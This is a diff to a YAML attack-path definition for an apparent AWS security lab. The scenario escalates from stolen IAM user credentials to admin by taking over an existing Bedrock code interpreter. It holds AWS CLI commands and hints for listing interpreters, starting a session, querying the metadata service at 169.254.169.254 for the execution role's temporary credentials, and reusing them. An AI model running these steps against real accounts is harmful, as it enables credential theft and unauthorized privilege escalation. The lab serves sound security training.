@@ -5,6 +5,8 @@ attackMap:
       type: principal
       subType: iam-user
       arn: "arn:aws:iam::{account_id}:user/pl-prod-bedrock-002-to-admin-starting-user"
+      access:
+        type: assumed-breach-credentials
       description: >
         You have gained access to this principal's AWS IAM credentials. These could
         have been obtained through many real-world vectors: phishing a developer and
@@ -49,10 +51,16 @@ attackMap:
         Start a session on the existing code interpreter. Because the role is already
         attached to the interpreter, no iam:PassRole permission is required.
       hints:
-        - "You can interact with existing Bedrock code interpreters."
-        - "Look for code interpreters that already have privileged roles attached."
-        - "Browse to https://pathfinding.cloud/paths/bedrock-002 for technique details."
+        - "Start by enumerating what Bedrock code interpreters exist in this account -- your helpful permissions let you list and inspect them."
+        - "Use bedrock-agentcore:ListCodeInterpreters to discover interpreters, then bedrock-agentcore:GetCodeInterpreter to examine their execution roles."
+        - "When you find a code interpreter with a privileged execution role, that interpreter is your target -- no need to create a new one."
+        - "You can start a session on an existing interpreter without iam:PassRole because the role is already attached. Look for the start-session API call in the bedrock-agentcore service."
+        - "Browse to https://pathfinding.cloud/paths/bedrock-002 for technique details and context on this attack path."
       commands:
+        - description: "List available code interpreters to identify the target"
+          command: "aws bedrock-agentcore list-code-interpreters"
+        - description: "Inspect the execution role of the target interpreter"
+          command: "aws bedrock-agentcore get-code-interpreter --interpreter-id pl-prod-bedrock-002-to-admin-target-interpreter"
         - description: "Start a session on the existing code interpreter"
           command: "aws bedrock-agentcore start-code-interpreter-session --code-interpreter-id pl-prod-bedrock-002-to-admin-target-interpreter"
 
@@ -63,11 +71,14 @@ attackMap:
         Execute Python code within the interpreter session to access the MicroVM
         Metadata Service and extract the execution role's temporary credentials.
       hints:
-        - "The interpreter runs on a MicroVM with a metadata service."
-        - "Try accessing 169.254.169.254 from within the interpreter."
-        - "The path /latest/meta-data/iam/security-credentials/execution_role returns credentials."
+        - "The code interpreter runs inside a MicroVM -- think about what services are typically available to compute workloads running in AWS."
+        - "EC2 instances expose a metadata service at a well-known link-local address. Bedrock code interpreters run on Firecracker MicroVMs and expose a similar service."
+        - "Use the invoke-code-interpreter API to send Python code into the running session. Your code can make HTTP requests to internal addresses."
+        - "Once inside the interpreter, query the metadata endpoint to discover what IAM role is attached, then retrieve its temporary credentials."
+        - "The credentials returned from the metadata service include AccessKeyId, SecretAccessKey, and a session Token -- export all three to assume the role's identity locally."
+        - "Browse to https://pathfinding.cloud/paths/bedrock-002 for full technique context and comparison with the bedrock-001 path."
       commands:
         - description: "Invoke the interpreter to extract credentials from MMDS"
-          command: "aws bedrock-agentcore invoke-code-interpreter --code-interpreter-id pl-prod-bedrock-002-to-admin-target-interpreter --session-id <SESSION_ID> --code 'import urllib.request; print(urllib.request.urlopen(\"http://169.254.169.254/latest/meta-data/iam/security-credentials/execution_role\").read().decode())'"
+          command: "aws bedrock-agentcore invoke-code-interpreter --code-interpreter-id pl-prod-bedrock-002-to-admin-target-interpreter --session-id <SESSION_ID> --name executeCode --arguments '{\"code\": \"<extraction_script>\", \"language\": \"python\"}'"
         - description: "Verify admin access with extracted credentials"
           command: "AWS_ACCESS_KEY_ID=<extracted> AWS_SECRET_ACCESS_KEY=<extracted> AWS_SESSION_TOKEN=<extracted> aws iam list-users"
